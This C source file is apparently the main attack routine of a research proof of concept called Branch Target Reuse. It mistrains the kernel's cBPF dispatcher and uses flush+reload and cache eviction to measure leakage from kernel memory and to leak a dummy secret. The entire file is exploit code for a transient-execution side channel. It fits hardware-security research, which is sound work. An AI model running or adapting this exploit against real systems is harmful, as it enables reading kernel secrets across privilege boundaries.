/*
 * Branch Target Reuse (BTR)
 * April 30th 2026
 * Sander Wiebing
 */

#define _GNU_SOURCE

#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sched.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <signal.h>
#include <pthread.h>
#include <syscall.h>
#include <stdatomic.h>


#include "flush_and_reload.h"
#include "flush_and_reload_cb.h"
#include "common.h"
#include "cbpf.h"
#include "find_l2_set.h"
#include "l3_eviction.h"

#define DEBUG




void * thread_perform_attack(void * arg) {
    struct config * cfg = (struct config *) arg;
    pin_to_core(LEAK_CORE);

    cfg->do_evict = 1;
    cfg->gadget_nr = 0;


    // This will be our victim cBPF dispatcher
    // we aim to mistrain it
    insert_allow_all_prog();

    cfg->debug_evict = 1;
    cfg->ind_map_kern = (uint8_t *)(virt_to_physmap((uint64_t)cfg->ind_map, (uint64_t) cfg->phys_start));
    assert((uint64_t) cfg->ind_map_kern % HUGE_PAGE_SIZE == 0);

    printf("%20s: %#18lx | %20s: %#18lx\n", "User Huge Page", (uint64_t) cfg->ind_map, "Kernel Huge Page", (uint64_t) cfg->ind_map_kern);
    cfg->fr_buf = cfg->ind_map + 0x10000;
    cfg->reload_addr = cfg->fr_buf;
    cfg->fr_buf_kern = cfg->ind_map_kern + 0x10000;

    memset(cfg->fr_buf, 0x94, 0x1000);
    if (cfg->constant_blind_safe) {
        for (size_t i = 0; i < 0xff; i++) {
            memset(cfg->fr_buf + (i << 11), 0x94, 0xff);
        }
    }

    cfg->secret_addr = cfg->ind_map + 0x2000;
    cfg->secret_addr_kern = cfg->ind_map_kern + 0x2000;
    printf("%20s: %#18lx | %20s: %#18lx\n", "User FR_BUF", (uint64_t) cfg->fr_buf, "Kernel FR_BUF", (uint64_t) cfg->fr_buf_kern);


    printf("Testing hit rate!\n");
    if (cfg->constant_blind_safe == 0) {
        print_leakage_rate(cfg, 1000);
    } else {
        cb_print_leakage_rate(cfg, 100);
    }

    switch (cfg->leak_mode) {
    case 0:
        printf("================ Testing leakage rate ================\n");
        if (cfg->constant_blind_safe == 0) {
            leak_test_leakage_rate(cfg);
        } else {
            cb_leak_test_leakage_rate(cfg);
        }
        break;

    case 1:
        printf("============== Testing reuse rate =================\n");
        print_reuse_rate(cfg);
        break;

    case 2:
        printf("============== Leaking a dummy secret =================\n");
        if (cfg->constant_blind_safe == 0) {
            leak_dummy_secret(cfg);
        } else {
            cb_leak_dummy_secret(cfg);
        }
        break;

    default:
        break;
    }

    exit(0);

    fflush(stdout);

}
